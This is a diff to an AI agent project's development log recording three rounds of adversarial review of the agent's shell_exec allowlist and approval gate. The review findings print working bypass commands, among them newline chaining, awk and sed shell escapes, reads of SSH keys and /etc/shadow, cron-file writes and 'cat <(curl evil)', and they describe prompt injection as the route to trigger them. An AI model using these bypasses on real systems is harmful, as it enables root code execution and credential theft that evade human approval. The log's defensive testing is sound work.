@@ -10573,3 +10573,745 @@ as an always-on skill from Slice 2b; Slice 4 adds the `runGates()`
 runtime function and the five hard gates per Component 5.
 
 End of session 2026-05-15 Slice 3c.
+
+---
+
+## [2026-05-15] Slice 3c.1 — Gate-ordering fix: allowlist must precede approval-gate steps
+
+**TL;DR.** Slice 3c (PR #23) added the read-only allowlist inside
+`shell-exec.js` at the top of the tool function and claimed
+"allowlist as primary defence, approval gates as second-line". The
+test (`tests/shell-exec-allowlist.test.js`) and verification harness
+(`scripts/verify-shell-allowlist.js`) both passed because both
+invoked `createShellExecTool().fn(args)` in isolation. The live
+runtime failed: `ToolExecutor.run()` invokes `approvalGate.check()`
+BEFORE the tool function runs. `shell_exec` is in the default
+`gatedTools` list — step 3 of the gate caught every `shell_exec`
+call (including `pm2 list`) and demanded approval before the inner
+allowlist could speak. Second consecutive slice this week to ship
+with isolated unit tests passing while runtime was broken (3b.1 was
+the first).
+
+### Live failure — verbatim
+
+Smoke test 2026-05-15 ~17:00 Athens. Tyson sent "check pm2 status"
+to Charlie via Telegram. Approval prompt fired:
+
+```
+Tool: shell_exec
+Agent: unknown
+Risk: high
+Action: shell_exec({"command":"pm2 list"})
+```
+
+Expected per Slice 3c contract: `pm2 list` runs without prompt
+(allowlisted). Observed: gate fired at step 3 (gatedTools includes
+'shell_exec') with riskLevel:'high', a prompt was sent to Telegram,
+and Charlie blocked awaiting human decision. The inner allowlist in
+`shell-exec.js` lines 108-129 was never consulted.
+
+### Audit findings
+
+1. **Gate ordering bug (primary).** `src/tools/executor.js` lines
+   130-146 invokes `approvalGate.check()` before
+   `tools.executeTool()`. `src/security/approval-gate.js` `check()`
+   pre-3c.1 step order: 0. autoApproveTools, 1.
+   `_matchDestructivePattern`, 2. skill-dir bypass, 3. gatedTools,
+   4. Stripe charge. `shell_exec` is in gatedTools by default
+   (`src/index.js` line 225-227 constructs `ApprovalGate` with
+   `gatedTools: this.config.tools?.requireApproval` and the
+   constructor defaults to `['shell_exec']`). Step 3 caught every
+   shell_exec call.
+
+2. **Brief's hypothesized root cause was off, but the fix shape was
+   right.** Brief speculated `_matchDestructivePattern` matched
+   `pm2 list`. Audit confirmed it does NOT — `DEFAULT_DESTRUCTIVE_
+   PATTERNS` contains `pm2 stop`, `pm2 delete`, `pm2 restart` as
+   two-word verbs, and `_matchDestructivePattern` matches exact
+   first-two tokens. `pm2 list` → `firstTwo = "pm2 list"` → no
+   pattern match → returns null. The actual greedy catch was at
+   step 3 (the entire `shell_exec` tool gated). Recording this so
+   future audits don't chase the wrong line.
+
+3. **`Agent: unknown` in approval prompt.** `executor.js` line 135
+   uses `options.agent || 'unknown'`. `src/agents/registry.js` line
+   391 calls `toolExecutor.run(messages, {model, system})` — no
+   `agent` field passed. Filed as separate followup in
+   `FLOW_OS_STATE.md`. Out of scope for 3c.1 (the approval prompt
+   should not fire AT ALL for `pm2 list`; the prompt's labelling is
+   a secondary issue).
+
+4. **`scripts/verify-shell-allowlist.js` gap.** Calls
+   `tool.fn(args)` directly. Never instantiates `ApprovalGate`,
+   never invokes `approvalGate.check()`. Passed in isolation while
+   the layer above was broken. This is the same failure pattern as
+   Slice 3b — verification harness exercised the inner unit, not
+   the layered call site.
+
+### Fix — three units
+
+**Unit 1 — `src/security/approval-gate.js` early branch (commit 26bbe79).**
+New step 1 in `check()`:
+
+```js
+if (toolName === 'shell_exec') {
+  const command = toolArgs?.command;
+  if (typeof command === 'string' && command.trim().length > 0) {
+    const allowlistResult = checkAllowlist(command);
+    if (allowlistResult.allowed) { /* log debug */ }
+    else { /* log debug not_allowlisted */ }
+    return { requiresApproval: false };
+  }
+  // empty/missing command falls through to legacy gatedTools path
+}
+```
+
+Allowlisted commands bypass the gate; the tool function runs and
+the audit log records `shell_exec` with the result. Non-allowlisted
+commands also bypass the gate so the inner allowlist in
+`shell-exec.js` produces the single-source-of-truth
+`{error:'not_allowlisted', reason, verb, suggestion}` response.
+The inner allowlist now functions as a redundant second-line
+defence — fine.
+
+**Unit 2 — `scripts/verify-approval-gate-allowlist-ordering.js`
+(commit 41f62b8).** New harness that drives the LIVE
+`ToolExecutor` per-tool-call body against real `ApprovalGate`, real
+`ExecApprovals`, real `ToolRegistry`, real `shell_exec`. 13 test
+commands, 53 assertions:
+- C1: 4 allowlisted (pm2 list, ls /tmp, git log, cat) → no
+  prompt, fn runs, numeric exit_code.
+- C2: 6 non-allowlisted (whoami, rm -rf, pm2 stop, curl|sh,
+  chained, command sub) → no prompt, error=not_allowlisted with
+  suggestion text.
+- C3: 3 DENY-path (cat .env, cat .ssh, cat .secrets) → no prompt,
+  error="Command denied by policy" with pattern_matched.
+- Sanity: notifier fired zero times across all 13 commands.
+
+The harness instruments `approvalGate.requestApproval` so any
+attempted prompt is recorded and returned as denied (no 10-min
+hang). Slice 3c's harness must be re-run alongside this one for
+any future shell-exec / gate work; both passing is the contract.
+
+**Unit 3 — `tests/approval-gate-allowlist-ordering.test.js` + docs
+(this commit).** 36 unit-level assertions on `approval-gate.check()`
+contract: allowlisted → false, not-allowlisted → false,
+destructive verb at gate → false (inner allowlist handles),
+ssh_exec unchanged (destructive pattern still gates), empty
+command falls through, autoApproveTools wins. Wired into npm test.
+`CHARLIE_OVERHAUL.md` Slice 3c amended to "verified-then-amended"
+with a Slice 3c.1 pointer. `FLOW_OS_STATE.md` followups filed for
+"Agent: unknown" and the destructive-pattern interaction watch.
+
+### Verification — live call path
+
+```
+$ node scripts/verify-approval-gate-allowlist-ordering.js
+... 53 passed, 0 failed
+$ node tests/approval-gate-allowlist-ordering.test.js
+... 36 passed, 0 failed
+$ node tests/shell-exec-allowlist.test.js
+... 55 passed, 0 failed
+$ node tests/approval-gate-notifier.test.js
+... 13 passed, 0 failed
+```
+
+Pre-existing test flake unrelated to this slice:
+`probes.test.js: pm2_processes: failure carries error string` —
+fails on dev box because pm2 actually runs locally and the test
+expects probe failure. Pre-existed on `main` at `70d42ed`. Not
+touched by 3c.1.
+
+### Lesson and Slice 4 motivation
+
+Slice 3b shipped a registry coupling that worked in tests but
+emitted no log event when no skills routed, so generic messages
+showed zero tool-call.log entries — indistinguishable from "code
+never ran". Slice 3c shipped a layered defence where the test
+exercised the inner layer in isolation while the layer above
+caught everything. Both passed unit tests; both broke on first
+runtime use. Common pattern: **verification harness exercised the
+inner unit, not the layered call site.**
+
+Mitigation in Slice 3c.1: a harness that drives the executor-level
+call sequence end-to-end against real instances. Structural
+mitigation in Slice 4: a runtime verification gate that detects
+"claimed behaviour vs observed log shape" mismatches and surfaces
+them before a slice ships. Slice 4 is now the explicit next
+priority.
+
+### Slice 3 family closure (revised)
+
+- Slice 3a (PR #18, 2026-05-14) — registry refactor + dead surface
+  removal — ✓ COMPLETE
+- Slice 3b (PR #19, 2026-05-14) — skill-loading ↔ tool-registration
+  coupling — ✓ COMPLETE (verified-then-amended via 3b.1)
+- Slice 3b.1 (PR #20, 2026-05-14) — per-message coupling
+  observability + end-to-end test — ✓ COMPLETE
+- Slice 3c (PR #23, 2026-05-15) — allowlist + name reconciliation
+  — ✓ COMPLETE (verified-then-amended via 3c.1)
+- Slice 3c.1 (this PR, 2026-05-15) — gate-ordering fix + live-path
+  harness — ✓ COMPLETE
+
+Slice 3 family ✓ FULLY CLOSED (revised). Slice 4 (verification
+gates) begins next session.
+
+End of session 2026-05-15 Slice 3c.1.
+
+---
+
+## [2026-05-15] Slice 3c.1 — pre-PR adversarial review caught CRITICAL newline-injection regression
+
+**TL;DR.** Slice 3c.1's gate-ordering fix landed three commits (26bbe79,
+41f62b8, c54d727) on `cc/slice3c1-allowlist-ordering-fix-20260515-1944`
+and PR #24 was opened in draft. Before flipping ready-for-review the
+PR was put through an adversarial review. The review found a CRITICAL
+regression introduced by Slice 3c.1 itself: the new early shell_exec
+branch in `ApprovalGate.check()` (commit 26bbe79) consults
+`checkAllowlist()` and returns `requiresApproval:false`, but
+`CHAIN_REJECT_PATTERNS` in `src/tools/shell-exec-allowlist.js` lines
+53-60 catches `;`, `&&`, `||`, `&`, `$(`, and backtick — but NOT
+`\n` or `\r`. Bash treats newline as `;`. The pre-3c.1 backstop was
+the `gatedTools` step in `ApprovalGate.check()`, which would have
+forced any shell_exec call through Telegram approval, exposing the
+full command body to Tyson. Slice 3c.1 removed that backstop.
+
+### Verbatim repro — adversarial probe
+
+```
+shell_exec({command: "pm2 list\necho pwned"})
+```
+
+Pre-fix path: `ApprovalGate.check('shell_exec', {command:'pm2 list\necho pwned'})`
+→ early shell_exec branch → `checkAllowlist('pm2 list\necho pwned')`
+→ splits on `|` only (no `|` present), so single segment
+`'pm2 list\necho pwned'`, tokens `['pm2', 'list\necho', 'pwned']`,
+firstTwo = `'pm2 list\necho'`... wait — the actual splitter is
+`split(/\s+/)` which DOES treat `\n` as whitespace. So tokens become
+`['pm2', 'list', 'echo', 'pwned']`, firstTwo = `'pm2 list'` (allowlisted).
+`checkAllowlist` returned `{allowed:true, segments:1}`. Gate returned
+`{requiresApproval:false}`. `shell-exec.fn` ran `execAsync('pm2 list\necho pwned',
+{ shell: '/bin/bash', cwd: '/root/QClaw' })` as root. Both lines
+executed. Audit log recorded a single `shell_exec` action with
+`command: "pm2 list\necho pwned"` truncated to 200 chars. **No
+approval prompt fired.** Attack vector: any prompt injection that
+gets Charlie to emit a shell_exec call with `"<allowlisted-verb>\n<arbitrary>"`.
+
+Confirmed empirically pre-fix:
+
+```
+$ node -e "import('./src/tools/shell-exec-allowlist.js').then(({checkAllowlist}) => { console.log(JSON.stringify(checkAllowlist('pm2 list\necho pwned'), null, 2)); });"
+{
+  "allowed": true,
+  "segments": 1
+}
+```
+
+### Fix — newline added to CHAIN_REJECT_PATTERNS
+
+Commit (Commit A on the remediation branch): `src/tools/shell-exec-allowlist.js`
+gains `{ name: 'newline', re: /[\r\n]/ }` in `CHAIN_REJECT_PATTERNS`.
+Post-fix:
+
+```
+$ node -e "import('./src/tools/shell-exec-allowlist.js').then(({checkAllowlist}) => { console.log(JSON.stringify(checkAllowlist('pm2 list\necho pwned'), null, 2)); });"
+{
+  "allowed": false,
+  "reason": "chain_or_substitution",
+  "pattern": "newline",
+  "suggestion": "command chaining / substitution (newline) is not permitted. run sub-commands as separate shell_exec calls. pipes (|) are allowed."
+}
+```
+
+Regression test added to `tests/approval-gate-allowlist-ordering.test.js`
+(21 new assertions in a "Newline-injection regression (Slice 3c.1
+adversarial review)" section). Drives the live executor sequence
+(real `ApprovalGate` + real `ToolRegistry` + real `shell_exec` via
+`registerBuiltin`, calling `approvalGate.check()` then
+`tools.executeTool()`). Asserts error=`not_allowlisted`, reason=
+`chain_or_substitution`, suggestion mentions `newline`, exit_code=-1,
+notifier fires zero times. Covers `\n` after allowlisted verb, `\r`
+alone, simple-verb + `\n`, and CRLF.
+
+### Harness gap closed — C4 inner-DESTRUCTIVE path
+
+Commit B added a C4 case-set to `scripts/verify-approval-gate-allowlist-ordering.js`
+that drives the allowlisted-verb-with-inner-DESTRUCTIVE shape through
+the full executor sequence:
+
+- `cat /tmp/x > /etc/passwd` (allowlisted verb `cat`, redirect-outside-/tmp DESTRUCTIVE)
+- `ls > /etc/attack.txt` (allowlisted verb `ls`, redirect-outside-/tmp DESTRUCTIVE)
+- `sudo pm2 list` (sudo DESTRUCTIVE)
+
+For each: outer gate's early shell_exec branch returns
+`requiresApproval:false` (verb is allowlisted), then `shell-exec.fn()`
+reaches the `DESTRUCTIVE_PATTERNS` check and fires
+`approvalGate.requestInlineApproval`. The harness's instrumented
+`requestInlineApproval` records the call and auto-denies; tool
+returns `{error:'Approval denied', exit_code:-1}`. Distinct shape
+from C1/C2/C3 (where the inline-approval path is never reached).
+
+This closes a harness gap the adversarial review flagged: the
+docstring at lines 5-7 claimed "inner allowlist + DENY +
+DESTRUCTIVE" coverage but the C3 cases only drove DENY. Same shape
+of gap as Slice 3c (harness green, runtime broken). Could not ship
+3c.1 with the same gap.
+
+Harness output: 78 passed, 0 failed (was 53 passed; 25 new).
+
+Also added: newline-injection case to C2 (`pm2 list\necho pwned`)
+for harness completeness — lands as
+`error=not_allowlisted`, reason=`chain_or_substitution`.
+
+### Followups filed (separate dispatches)
+
+Filed in `FLOW_OS_STATE.md` Section 7 → Tool surface:
+
+- **LOW — `awk -i inplace` executes.** No `DISALLOWED_FLAGS` entry
+  for awk. Equivalent to `sed -i` (which IS blocked). Pre-existing
+  from Slice 3c, surfaced by 3c.1 adversarial review.
+- **LOW — `pm2 restart` / `pm2 reload` documentation drift.**
+  shell-exec.js line 60 comment claims these are "recovery ops NOT
+  gated" but they're not on the allowlist either, so blocked outright
+  with `not_allowlisted`. Also: `pm2 restart` is in the gate's
+  `DEFAULT_DESTRUCTIVE_PATTERNS` (contradictory second signal).
+  Pre-existing from Slice 3c.
+
+### Process win
+
+The adversarial-review-before-PR-ready protocol caught a CRITICAL bug
+that:
+- the unit test `tests/shell-exec-allowlist.test.js` (55 checks, all
+  passing) missed — no test case exercised `\n` or `\r` in the command
+  body
+- the live-path harness `scripts/verify-approval-gate-allowlist-ordering.js`
+  (53 checks, all passing) missed — the C2 non-allowlisted set only
+  included `;`, `&&`, `$()` chain shapes
+- the new unit test `tests/approval-gate-allowlist-ordering.test.js`
+  (36 checks, all passing) missed — only exercised gate.check() in
+  isolation, not the full executor sequence with a real shell-exec
+
+This is the third consecutive slice in eight days to ship into
+review with isolated tests passing while the runtime / threat-model
+contract was broken (3b.1, 3c → 3c.1 was the first two; 3c.1 itself
+was the third). Common pattern: **the harness exercises happy-path
+shapes from the original author's mental model, not adversarial
+shapes from an attacker's mental model.** Adversarial review pre-PR
+is now the explicit mitigation. Slice 3 family closes with: Slice 3a
++ 3b + 3b.1 + 3c + 3c.1 + adversarial review of 3c.1 → green.
+
+The PR (#24) remains in draft pending a second pass from the
+adversarial reviewer; only un-drafted after that returns clean.
+
+End of session 2026-05-15 Slice 3c.1 remediation.
+
+## [2026-05-15] Slice 3c.1 — pre-PR adversarial review round 2 caught 2 CRITICAL + 2 HIGH allowlist-escape bypasses
+
+> **SUPERSEDED by the round-3 + halt-and-redirect closure entry below
+> (same date).** Round 3 surfaced 4 more CRITICALs from independent
+> failure modes (sort `--compress-program`, env-var/tilde DENY bypass,
+> find `-fls`, process substitution). Pattern recognised: allowlist-by-
+> enumeration is structurally indefensible. The round-2 remediation
+> (drop awk/sed, reject `..`, harness C5) has been reverted in the
+> scope-reduction commit on the same branch. This section is retained
+> as historical record of the round-2 findings + decision sequence.
+
+**TL;DR.** Round-2 adversarial pass on the post-newline-fix branch
+surfaced four additional bypasses. Decision per Tyson: drop awk +
+sed from `ALLOWED_VERBS` rather than chase enumerated flag/body
+bans. Plus a path-traversal `..` rejection. Three remediation
+commits on the same branch. Harness now 135/135 passing
+(was 78/78; 57 new assertions). PR #24 still draft.
+
+### Round-2 findings (verbatim repros)
+
+**CRITICAL #1 — awk shell-escape via `system()` builtin.**
+
+```
+shell_exec({command: 'awk BEGIN{system("echo PWNED")}'})
+```
+
+`checkAllowlist` returns `{allowed:true}` (awk is on SINGLE_VERBS,
+no chain pattern, no DESTRUCTIVE hit). `execAsync(command, {shell:
+'/bin/bash'})` invokes awk; awk's `BEGIN{...}` block runs the
+quoted program; `system("echo PWNED")` spawns `/bin/sh -c "echo
+PWNED"` from inside awk. Net effect: arbitrary shell execution as
+root with no approval prompt. Variants enumerated in the test
+file: `awk -e BEGIN{system(...)}`, `awk 'BEGIN{print "x" | "sh"}'`,
+`awk 'BEGIN{getline cmd < "/etc/passwd"; print cmd}'`, awk's `|&`
+coprocess operator.
+
+**CRITICAL #2 — sed shell-escape via the `e` command.**
+
+```
+shell_exec({command: 'sed -e "1e echo PWN_SED" /tmp/x'})
+```
+
+GNU sed's `e` command executes the shell once per pattern-matched
+line. `DISALLOWED_FLAGS.sed` only contained `-i` / `--in-place`;
+the `e` command lives inside the script body, not on the argv.
+Linux qclaw production = RCE.
+
+**HIGH #1 — sed internal file I/O.**
+
+```
+sed -e "1r /etc/shadow" /tmp/x       # reads /etc/shadow to stdout
+sed -e "w /etc/cron.d/evil" /tmp/x   # writes pattern-space lines to /etc/cron.d/evil
+```
+
+sed's `r` (read file into pattern space, printed on output) and
+`w` (write pattern space to file) commands operate via sed's
+internal file machinery — they don't appear as shell redirects, so
+the DESTRUCTIVE `>\s*\/(?!dev\/null|tmp\/)` regex doesn't see
+them. Same surface: `R` (read line by line) and `W` (conditional
+write).
+
+**HIGH #2 — path-traversal through redirect-outside-/tmp.**
+
+```
+shell_exec({command: 'cat /tmp/x > /tmp/../etc/passwd'})
+```
+
+`cat` is allowlisted. The DESTRUCTIVE regex
+`>\s*\/(?!dev\/null|tmp\/)` sees `> /tmp/` and exempts the
+redirect. Bash then resolves `/tmp/../etc/passwd` →
+`/etc/passwd` at exec time. Mixed-dot variant `/tmp/./../etc/passwd`
+same bypass. `tee /tmp/../etc/cron.d/evil` analogous.
+
+### Decision rationale (Tyson, verbatim from brief)
+
+> drop the rich verbs rather than try to enumerate dangerous flags
+> and body content.
+
+The two paths considered:
+
+- **(a)** Enumerate dangerous flags/body content per verb (`awk:
+  ['-i', '--include']`, `sed -e "<digit>e"`, sed `r`/`w`/`R`/`W`,
+  `..` after redirects). Sustainable only if awk/sed body grammars
+  are bounded; both are general-purpose languages. Any future
+  flag or grammar extension reopens the bypass surface.
+- **(b)** Drop awk + sed entirely. Read-only awk/sed cases are
+  covered by `grep -E`, `head`, `tail`, `cat`, `wc`. Complex
+  transforms go through `claude_code_dispatch` (Slice 5).
+  Conservative; agent rarely needs awk/sed for read-only work.
+
+Tyson chose (b). Slice 3d (CHARLIE_OVERHAUL.md planned slices)
+takes the structural redesign — argv-parser instead of
+shell-string parsing.
+
+### Scope amendment
+
+Slice 3c.1 expanded from "gate ordering fix" → **"gate ordering +
+allowlist hardening"**. Single remediation commit on this branch
+covers:
+
+- `src/tools/shell-exec-allowlist.js`:
+  - Remove `'awk'`, `'sed'` from `SINGLE_VERBS`.
+  - Remove dead `DISALLOWED_FLAGS.sed = ['-i', '--in-place']`
+    entry (verb no longer reachable).
+  - Add `{ name: 'parent-dir traversal', re: /\.\./ }` to
+    `CHAIN_REJECT_PATTERNS`. Blanket `..` rejection. Returns
+    `not_allowlisted` with `reason=chain_or_substitution,
+    pattern=parent-dir traversal`. Conservative-but-clean:
+    catches `cat ../foo` too, but allowlisted read-only verbs
+    operating on `..` paths are rare and absolute paths work
+    equally well.
+  - Update docstring header to describe both hardenings.
+- `src/tools/shell-exec.js`: tool `description` field updated to
+  reflect dropped verbs.
+- `tests/shell-exec-allowlist.test.js`: removed awk/sed from
+  ALLOWED_FORMS, added "awk + sed dropped" section with the
+  CRITICAL #1/#2 + HIGH #1 repros asserting `not_allowlisted`,
+  added "Path-traversal `..` rejected anywhere" section with the
+  HIGH #2 repros + plain `..` cases.
+- `tests/approval-gate-allowlist-ordering.test.js`: new section
+  "Round-2 adversarial findings (Slice 3c.1)" — 8 cases driven
+  through the live executor sequence (real ApprovalGate + real
+  ToolRegistry + real shell_exec via registerBuiltin), asserting
+  each surfaces as `error=not_allowlisted` at the tool layer with
+  no notifier fire. Total test now 98/98 (was 57/57; +41 round-2
+  assertions).
+- `scripts/verify-approval-gate-allowlist-ordering.js`: new C5
+  case-set covering the same eight cases. Docstring updated.
+  Harness now 135/135 (was 78/78; +57 round-2 assertions).
+- `FLOW_OS_STATE.md`: `awk -i inplace` LOW followup resolved
+  (closed by dropping the verb). One `pm2 restart/reload` LOW
+  followup remains untouched.
+- `CHARLIE_OVERHAUL.md`: scope-amendment subsection appended to
+  Slice 3c.1; new Slice 3d "Allowlist redesign" entry filed in
+  planned slices.
+
+### Verification (verbatim)
+
+All test files pass individually (16/16, modulo pre-existing
+`probes.test.js` `pm2_processes` dev-env flake unchanged from
+`main`). Harness output captured in PR body.
+
+Ad-hoc adversarial probe (full executor sequence, instrumented to
+count notifier / outerApproval / inlineApproval fires) confirms all
+four findings reach `tools.executeTool()` and return
+`error: 'not_allowlisted'` with `exit_code: -1` — and crucially
+that all three approval-path counters remain at zero for every
+case. Probe script `/tmp/round2-adversarial-probe.js` (not
+committed). Probe output:
+
+```
+=== OVERALL: PASS — all four round-2 findings rejected, no approval paths fired ===
+Total counters: notifier=0, outerApproval=0, inlineApproval=0
+```
+
+### Process win, again
+
+Round-2 caught 4 CRITICAL/HIGH bugs that:
+- the 62-assertion unit test (post-round-1) missed — only exercised
+  `\n` injection
+- the 78-case harness (post-round-1) missed — C2 had `;`/`&&`/`$()`
+  + newline but not awk-body, sed-script, or `..`-traversal shapes
+- the 57-assertion ordering test (post-round-1) missed — only
+  exercised newline injection in the live-executor path
+
+Three rounds of review on the same branch surfacing a CRITICAL
+each time confirms the structural problem: enumeration-by-allowlist
+cannot keep up with adversarial pressure on rich verbs. Slice 3d
+captures the planned redesign. Until that lands, the operational
+posture is: minimum verb set, maximum body restrictions, drop any
+verb that exposes a non-flag-enumerable shell-spawn or file-I/O
+surface.
+
+End of session 2026-05-15 Slice 3c.1 round-2 remediation.
+
+## [2026-05-15] Slice 3c.1 closure — three-round adversarial review + halt-and-redirect-to-3d
+
+**TL;DR.** Round 3 of adversarial review on the post-round-2 branch
+surfaced 4 more CRITICAL/HIGH allowlist-escape bypasses, from a third
+independent failure mode (regex-on-unexpanded-string vs bash-expanded
+paths). Three consecutive rounds, four CRITICALs across three failure
+modes. Decision per Tyson: halt tactical patching, accelerate Slice 3d
+(allowlist redesign). PR #24 scope reduced to gate-ordering fix +
+newline regex + feature-flag disable for `shell_exec`. Round-2
+remediation reverted (awk/sed back on allowlist, `..` regex removed) —
+the resulting surface is wider than pre-3c.1, which is why the feature
+flag exists: `QCLAW_SHELL_EXEC_ENABLED=0` (default) disables the tool
+end-to-end until Slice 3d lands.
+
+### Episode summary — three rounds, four CRITICALs, three failure modes
+
+The PR #24 branch went through three independent adversarial-review
+rounds in 48 hours. Each round found a CRITICAL bypass from a class
+the previous round hadn't covered:
+
+**Round 1 — newline chaining (CRITICAL).**
+Repro verbatim:
+```
+shell_exec({command: 'pm2 list\necho pwned'})
+```
+The post-3c.1 gate-ordering fix pre-approved any string command at the
+gate, then ran it under `execAsync(command, {shell:'/bin/bash'})`,
+which treats `\n` like `;`. Both lines ran as root with no approval
+prompt. `CHAIN_REJECT_PATTERNS` covered `;`, `&&`, `||`, `&`, `$(`,
+backticks — but not `\n`/`\r`. Fixed: `{ name: 'newline', re: /[\r\n]/ }`
+added to `CHAIN_REJECT_PATTERNS`. **This fix is load-bearing and stays
+in.** Verified by reviewer meta-check.
+
+**Round 2 — rich-verb body-content shell-escape (2 CRITICAL + 2 HIGH).**
+Repros verbatim:
+```
+awk BEGIN{system("echo PWN")}                 # CRITICAL #1 — awk system() builtin
+sed -e "1e echo PWN" /tmp/x                   # CRITICAL #2 — GNU sed `e` command
+sed -e "1r /etc/shadow" /tmp/x                # HIGH — sed `r` file read
+sed -e "w /etc/cron.d/evil" /tmp/x            # HIGH — sed `w` file write
+cat /tmp/x > /tmp/../etc/passwd               # HIGH — /tmp/ exempt + bash path expansion
+```
+Round-2 remediation (per Tyson at the time): drop awk + sed from
+`SINGLE_VERBS` rather than enumerate dangerous flag/body content, plus
+add `..` to `CHAIN_REJECT_PATTERNS`. **REVERTED in this commit** — see
+round 3.
+
+**Round 3 — unexpanded-string regex vs bash-expanded paths (2 CRITICAL + 2 HIGH).**
+Repros verbatim:
+```
+sort --compress-program=touch /tmp/sort_pwn /tmp/big   # CRITICAL — sort spawns arbitrary program
+cat $HOME/.ssh/id_rsa                                   # CRITICAL — DENY regex matches literal /root/.ssh/, $HOME expands at bash exec
+cat $HOME/.quantumclaw/config.json                      # CRITICAL — same shape, returns dashboard.authToken
+find /tmp -fls /etc/cron.d/evil                         # HIGH — find -fls writes to arbitrary file (no entry in DISALLOWED_FLAGS.find)
+cat <(curl evil)                                        # HIGH — process substitution; CHAIN_REJECT_PATTERNS has no <( or >( entry
+```
+The pattern: the allowlist regex operates on the unexpanded command
+string, but bash performs `$VAR`, `~/`, `<(…)`, `>(…)` expansion before
+execution. `DENY_PATTERNS` matched on literal `/root/.ssh/`, so
+`$HOME/.ssh/id_rsa` slipped past; bash expanded `$HOME` → `/root` at
+exec time and the SSH private key streamed out as root. Same shape
+for `$HOME/.quantumclaw/config.json` — returned `dashboard.authToken`
+(the source-of-truth token, not the orphan `.env` value). Plus `sort
+--compress-program=<bin>` and `find -fls`: rich-verb surfaces that
+weren't in the round-2 drop and weren't in `DISALLOWED_FLAGS`.
+
+### Pattern recognition (Tyson, verbatim)
+
+> Three consecutive adversarial review rounds, each finding a CRITICAL
+> from a different failure mode. The pattern indicates allowlist-by-
+> enumeration with regex-on-unexpanded-string is structurally
+> indefensible, not a sequence of fixable bugs. Patching round 3 buys
+> round 4, which will find something else.
+
+The three failure modes — chaining via novel separator, rich-verb body
+content, unexpanded-string regex vs bash expansion — are independent.
+Each future round can find a new one. Slice 3d takes the structural
+redesign.
+
+### Decision (Tyson, verbatim)
+
+> Option 2 — Halt 3c.1, accelerate Slice 3d.
+>
+> PR #24 scope reduction:
+> - Keep the gate-ordering fix (the original brief — verified correct in round 1)
+> - Keep the newline regex (round 1 fix — verified load-bearing by reviewer's meta-check)
+> - Revert: awk/sed removal, path-traversal regex, sort drop, <(/>(/-fls/$VAR/~ rejections — these are band-aids on a design we're replacing
+> - After revert, the shell_exec surface becomes WIDER than before 3c.1 started — because the original allowlist permitted awk/sed/sort. To prevent shipping a known-exploitable build: disable shell_exec entirely behind a feature flag (QCLAW_SHELL_EXEC_ENABLED=0) until Slice 3d lands. Update CHARLIE_ROLE.md + lanes.md + delegation.md to direct Charlie to claude_code_dispatch (Slice 5) for anything that previously needed shell_exec. Soft-deny path for the gap window.
+
+### What shipped (PR #24 reduced scope)
+
+- **Gate-ordering fix** (commit `26bbe79`, unchanged). Allowlist check
+  runs before approval-gate destructive/gatedTools steps for `shell_exec`.
+  Verified correct in round 1, retained as-is.
+- **Newline regex** (commit `99a8809`, unchanged). `\n` / `\r` added to
+  `CHAIN_REJECT_PATTERNS`. Verified load-bearing in reviewer meta-check
+  of round 2; retained as-is.
+- **`shell_exec` feature flag** (commit `9bbf30c`, this session). New
+  `QCLAW_SHELL_EXEC_ENABLED` env flag, default `'0'` / disabled. When
+  disabled (default), the tool is registered as a soft-deny stub that
+  returns `{ok:false, error:'shell_exec_disabled', reason:'...claude_code_dispatch...', command, exit_code:-1}`
+  without ever reaching `execAsync` or firing an approval prompt.
+- **Role + lane + delegation routing** (commit `91e5d30`). Charlie's
+  identity-layer docs updated to route any shell-style task through
+  `claude_code_dispatch` (Slice 5) instead of the disabled tool.
+
+### What got reverted (commit `2389bc1`)
+
+State of `src/tools/shell-exec-allowlist.js`, `src/tools/shell-exec.js`,
+the two test files, the harness, `CHARLIE_OVERHAUL.md`'s round-2
+amendment, and `FLOW_OS_STATE.md`'s round-2 followup-close — restored
+to commit `2de6aff`. Specifically:
+
+- `awk` + `sed` back in `SINGLE_VERBS`.
+- `DISALLOWED_FLAGS.sed = ['-i', '--in-place']` restored.
+- `..` parent-dir-traversal entry removed from `CHAIN_REJECT_PATTERNS`.
+- Tool description back to the original verb list.
+- Test "awk + sed dropped" + "Path-traversal `..`" sections removed.
+- Harness C5 case-set removed.
+- `awk -i inplace` LOW followup back to OPEN.
+
+The resulting `shell_exec` surface is **wider** than pre-3c.1 (because
+the original allowlist permitted awk/sed/sort/etc with all their
+known bypasses) — which is exactly why the feature flag disables the
+tool wholesale rather than shipping a known-exploitable build.
+
+### Verification (verbatim probe output)
+
+`/tmp/qclaw-shell-exec-flag-probe.js` (not committed) drives the full
+executor sequence (real `ApprovalGate` + real `ToolRegistry` + the
+registration code from `src/index.js`) against both flag states.
+
+Default (disabled):
+```
+$ node /tmp/qclaw-shell-exec-flag-probe.js
+QCLAW_SHELL_EXEC_ENABLED=(unset) → isShellExecEnabled()=false
+--- Flag DISABLED: soft-deny stub asserts ---
+  PASS  disabled: gate requiresApproval=false (no prompt)
+  PASS  disabled: ok=false
+  PASS  disabled: error='shell_exec_disabled'
+  PASS  disabled: reason mentions claude_code_dispatch
+  PASS  disabled: exit_code=-1
+  PASS  disabled: no notifier fired
+  PASS  disabled: no approval prompt fired
+  PASS  disabled: even non-allowlisted commands surface the soft-deny shape
+Total counters: notifier=0, outerApproval=0
+8 passed, 0 failed
+```
+
+Re-enabled (for the round-1 regression check that the underlying
+gate-ordering + newline logic still works when the flag is on):
+```
+$ QCLAW_SHELL_EXEC_ENABLED=1 node /tmp/qclaw-shell-exec-flag-probe.js
+QCLAW_SHELL_EXEC_ENABLED=1 → isShellExecEnabled()=true
+--- Flag ENABLED: round-1 regressions still rejected ---
+  PASS  enabled/pm2 list: gate requiresApproval=false
+  PASS  enabled/pm2 list: did NOT return not_allowlisted
+  PASS  enabled/pm2 list: did NOT return shell_exec_disabled
+  PASS  enabled/pm2 list: no approval prompt fired
+  PASS  enabled/newline: error=not_allowlisted
+  PASS  enabled/newline: reason=chain_or_substitution
+  PASS  enabled/newline: suggestion mentions newline
+  PASS  enabled/.env: blocked by DENY policy
+  PASS  enabled/.env: pattern_matched=cat .env
+  PASS  enabled/.env: exit_code=-1
+  PASS  enabled overall: no approval prompts fired across all three cases
+  PASS  enabled overall: notifier never fired
+Total counters: notifier=0, outerApproval=0
+12 passed, 0 failed
+```
+
+Existing test files pass unchanged after the revert (they import
+`createShellExecTool` directly, intentional coverage of the
+underlying logic for the flag-on regression path):
+
+- `tests/shell-exec-allowlist.test.js`                55/55
+- `tests/approval-gate-allowlist-ordering.test.js`    57/57
+- `scripts/verify-approval-gate-allowlist-ordering.js` 78/78
+
+### Adversarial review pattern proven valuable
